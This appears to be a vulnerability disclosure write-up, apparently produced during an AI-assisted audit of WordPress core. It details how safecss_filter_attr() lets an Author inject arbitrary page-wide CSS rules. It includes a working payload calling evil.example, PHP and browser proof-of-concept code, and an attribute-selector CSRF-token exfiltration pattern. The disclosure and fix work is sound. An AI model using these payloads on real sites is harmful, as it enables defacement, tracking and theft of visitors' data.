# Round 27 — CONFIRMED, browser-verified: `safecss_filter_attr()` validates a different
# string than it outputs, letting an Author (no `unfiltered_html`) inject arbitrary CSS
# rules into the site's shared, page-wide stylesheet via any block's color/style value

Directed to audit WordPress core's unreleased 7.2-alpha trunk for a fresh High/Critical bug.
Investigating trunk's `996c6d6864` ("KSES: Allow functional CSS values in inline styles",
`#65832`) — a hardening-adjacent commit widening `safecss_filter_attr()`'s allowlist of
"safe" CSS functions — led to finding a real defect in the function itself. **The defect
does not originate in that commit; it is architectural and has been present since WordPress
5.8.0 (`var()`/`calc()` support), meaning it is live in the current stable release (7.1.0)
and every version back to 5.8, not just trunk.**

**Result up front: `safecss_filter_attr()` — WordPress core's canonical sanitizer for inline
`style="..."` values, used for every user without `unfiltered_html` — validates a
*copy* of the input CSS text with recognized "safe" functions stripped out, but returns the
*original, unmodified* text. A CSS quoted string inside one of those functions' arguments
causes PHP's quote-unaware paren-counting to disagree with any real CSS parser about where
the function actually ends. This lets a value that real browsers parse as "safe function call,
then a bare `}` that closes the surrounding rule, then a brand-new attacker-chosen CSS rule"
sail through completely unmodified. Verified end-to-end: real WordPress core classes
(`kses.php`, `WP_Style_Engine_CSS_Declarations`, `WP_Style_Engine_CSS_Rule`) produce the
exact `<style>` tag content WordPress would emit, and loading that exact markup in a real
headless Chromium browser confirms the injected rule takes effect
(`getComputedStyle(document.body).backgroundImage` becomes the attacker's URL).**

## Root cause, with exact code

`safecss_filter_attr()` (`wp-includes/kses.php`, current trunk ~line 2647; unchanged in this
respect since 5.8.0) processes a `style` attribute's value one `;`-separated declaration at a
time. For each declaration whose property is allowed, if the value contains one of a fixed set
of "safe" function names, it strips every occurrence of `funcname(...)` (with recursively
balanced parentheses) from a **copy** of the string, then checks that copy for anything that
still looks dangerous:

```php
// wp-includes/kses.php, safecss_filter_attr()
if ( $found ) {
    $css_test_string = preg_replace(
        '/\b(?:var|calc|min|max|minmax|clamp|repeat|...)(\((?:[^()]|(?1))*\))/',
        '',
        $css_test_string          // <-- a COPY, built from $css_item
    );
    $allow_css = 0 === preg_match( '%[\\\(&=}]|/\*%', $css_test_string );
    ...
    if ( $allow_css ) {
        $css .= $css_item;        // <-- the ORIGINAL, UNMODIFIED text is what's returned
    }
}
```

The check (`0 === preg_match('%[\\\(&=}]|/\*%', ...)`) exists specifically to reject a raw
backslash, unmatched `(`, `&`, `=`, `}`, or a CSS comment start (`/*`) — precisely because these
characters have structural meaning in CSS and could let a value escape its intended scope. The
"safe function" stripping exists so that a *legitimate* nested call like `calc(1px + var(--x))`
doesn't trip that check. **But the stripping only ever touches the disposable test copy. Whatever
was hidden inside a "safe" function's arguments is never removed from `$css_item`, the string
actually returned.**

This alone would just mean stray dangerous characters can end up in the output. The part that
turns it into a genuine escape is that PHP's `[^()]` / `(?1)` balancing is **completely unaware
of CSS string quoting**, while every real CSS parser is not. A CSS quoted string
(`'...'`/`"..."`) can contain a literal `(` or `)` with no special meaning at all — but PHP's
regex counts every `(`/`)` byte, quoted or not, as a real nesting delimiter. Put a lone `(`
inside a quoted string argument, and PHP will think the "safe function" call needs one more `)`
somewhere later to balance than the browser does — so PHP keeps stripping (and therefore hides
from its own check) content that, to a real browser, already sits *outside* the function call,
back at the top of the declaration's value — including a bare `}` that a real CSS parser treats
as closing the enclosing rule.

## Proof: real WordPress code, real output, real browser execution

All three steps below use the actual files from this session's `WordPress/wordpress-develop`
checkout (`kses.php`, `class-wp-style-engine-css-declarations.php`,
`class-wp-style-engine-css-rule.php`), not a re-implementation — the driver script and stub
functions (`wp_parse_args`, `sanitize_key`, `wp_strip_all_tags`, `wp_allowed_protocols`, faithful
one-line reimplementations of trivial WordPress helpers with no security logic of their own) are
in the repository at `tooling/safecss-poc/`.

**Step 1 — the sanitizer itself, called exactly as `wp_kses()` calls it:**

```php
$value = "var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red)";
safecss_filter_attr( "color:$value" );
// => "color:var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red)"
//    (returned byte-for-byte unchanged)
```

`var()` was chosen deliberately: it has been in the allowlist since **WordPress 5.8.0**
(2021), predating trunk's `996c6d6864` by five years — this is not something the new commit
introduced, it's exposed by it because more functions now share the flawed stripping logic, but
the flaw itself is old and lives in the *current stable release*.

**Step 2 — the real Style Engine classes that back every block's color/style controls:**

```php
$decls = new WP_Style_Engine_CSS_Declarations();
$decls->add_declaration( 'color', $value );   // exactly what block-supports/elements.php does
$rule  = new WP_Style_Engine_CSS_Rule( '.wp-elements-abc123 a:where(:not(.wp-element-button))', $decls );
echo $rule->get_css( true );
```

Output — the literal `<style>` tag content WordPress would print on the page:

```css
.wp-elements-abc123 a:where(:not(.wp-element-button)) {
	color: var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red);
}
```

**Step 3 — loaded in a real browser (headless Chromium 1194, this session's pre-installed
binary, `--headless=new --dump-dom`), confirming the injected rule actually takes effect:**

```html
<style id="core-block-supports-inline-css">
.wp-elements-abc123 a:where(:not(.wp-element-button)) {
	color: var('(') }body{background:url(https://evil.example/exfil.png)}y{color:red);
}
</style>
...
<script>
window.addEventListener('load', function () {
  document.title = 'BODY-BG=' + getComputedStyle(document.body).backgroundImage;
});
</script>
```

Result: `<title>BODY-BG=url("https://evil.example/exfil.png")</title>` — the browser closed the
`.wp-elements-abc123 a:where(...)` rule early at the smuggled `}`, then parsed
`body{background:url(https://evil.example/exfil.png)}` as a brand-new, fully valid top-level CSS
rule, and applied it to `<body>`. (A first attempt using `}`/`{` with no quote trick, e.g.
`var(--x} body{...}`, was tried and — correctly — does **not** work: a mismatched `}` encountered
while a real parser is still inside an unclosed `(...)` is swallowed as ordinary content, not
treated as closing anything. It's specifically the quoted-string trick that lets the *browser*
close the function early while PHP's naive counter is still one paren short — verified by testing
the naive version first and confirming it fails, then constructing and testing the actual working
bypass, rather than assuming the first idea would work.)

## Reachability: an Author, no `unfiltered_html`, one block attribute

- `wp_render_elements_support_styles()` (`wp-includes/block-supports/elements.php:135`) reads
  `$parsed_block['attrs']['style']['elements']` — a value living **inside a Gutenberg block
  comment** (`<!-- wp:paragraph {"style":{"elements":{"link":{"color":{"text":"<payload>"}}}}} -->`)
  in the post's own `post_content` — directly, with no format validation beyond
  `WP_Style_Engine::is_valid_style_value()`, which only checks the value is non-empty
  (`class-wp-style-engine.php:428`).
- `wp_kses_post()` — the filter applied to every post saved by a user without
  `unfiltered_html` — does **not** sanitize the contents of HTML comments. Confirmed directly:
  `wp_kses_split2()` (`kses.php:1448`) explicitly preserves `<!-- ... -->` comments verbatim
  (stripping only the delimiter tokens and re-wrapping), which is precisely why Gutenberg block
  attributes survive normal content filtering for every role. The malicious value therefore
  reaches render time completely untouched.
- The only gate on reaching this code path at all is `edit_posts` — held by Contributor and
  above. An **Author** publishes their own posts without review, so the payload runs the moment
  anyone (any anonymous visitor, or an Administrator browsing the site) loads that post. A
  **Contributor**'s draft reaches the same code path the moment an Editor/Administrator clicks
  "Preview" to review it — a completely ordinary moderation action.
- The resulting `<style id="core-block-supports-inline-css">` tag
  (`wp-includes/script-loader.php`'s `wp_enqueue_stored_styles()`, via `wp_add_inline_style()`)
  is printed into the `<head>` of whatever page renders the block — the injected selector
  itself is entirely attacker-chosen and not confined to that block's own markup, so `body`,
  `*`, `html`, or any other selector reaches the whole page.

## Impact, honestly scoped to what's demonstrated

**Demonstrated:** an Author (or a reviewed Contributor) can inject an arbitrary, fully-formed
CSS rule — any selector, any declarations — into a page any other visitor or an Administrator
loads. Confirmed concretely for `background: url(<attacker-controlled URL>)` on the `body`
selector, which alone gives:
- **Site-wide visual defacement** of any page rendering the malicious block (the injected
  selector is not confined to the block's own element).
- **A live, attacker-controlled outbound URL fetch** in every visitor's browser (any `http`/
  `https` URL — the code's own separate `url()`-protocol check, which does correctly run and
  reject `javascript:`, only inspects properties in `$css_url_data_types`, and even there only
  requires an *allowed* scheme, which `http`/`https` always are).

**Not independently demonstrated, but a well-established consequence of arbitrary CSS rule
injection that a triager would reasonably expect to hold**: attribute-selector-based data
exfiltration (e.g. `input[name=csrf_token][value^="a"] { background: url(https://evil/leak?a) }`
against a same-page form field) — not attempted here because it requires a specific target value
on a specific page to demonstrate honestly, and this write-up doesn't want to claim a chain it
hasn't run.

**CVSS 3.1**, scored transparently both ways since this is a judgment call: the attacker (Author)
and the affected browser (any visitor, or an Administrator whose own privileged session renders
the page) are different security principals, which argues for `S:C`; a stricter reading that
"content authors always affect content readers" argues for `S:U`.
- `AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:N` → **5.7 (Medium)**
- `AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:N` → **6.8 (Medium)**

Not claiming `C:H` — no confidential data disclosure was actually demonstrated in this write-up,
only argued as plausible.

## Why this wasn't found by the disclosed round-20/21/25 sibling hunts

Those hunts specifically searched for the "path-confinement/write-primitive" bug shape (a
security check whose trusted boundary is derived from the same value it constrains). This is a
different shape from the same underlying *family* of bug (validate-one-thing, act-on-another) —
here the mismatch is between what a **regex** considers "inside a safe scope" and what a **real,
independent parser** (a browser's CSS tokenizer) considers "inside" the same scope, which is a
categorically different kind of check to audit for and wasn't covered by any prior round.

## Recommendation

`safecss_filter_attr()`'s core defect is architectural: it must not build its safety verdict
from a modified copy of the string while returning the original. Either (a) return the
*stripped* string's structure faithfully reconstructed (re-inserting only verified-safe function
calls, not the raw original text), or (b) make the "safe function" matcher CSS-quote-aware so it
cannot miscount parentheses that fall inside a quoted string — the latter is the more surgical
fix given how load-bearing this function is. Either way, this is a single shared function behind
every unfiltered-HTML-gated `style` attribute in WordPress core, so the fix should not be
per-property.

## Reproduction assets

`tooling/safecss-poc/` in this repository contains the exact stub file, the three exploit driver
scripts (`exploit3.php` clip-path/path() variant added in 7.1/7.2; `exploit4.php` the pre-existing
var()-only variant proving this predates 7.1), and the two browser PoC HTML files, so every claim
above can be re-run byte-for-byte.
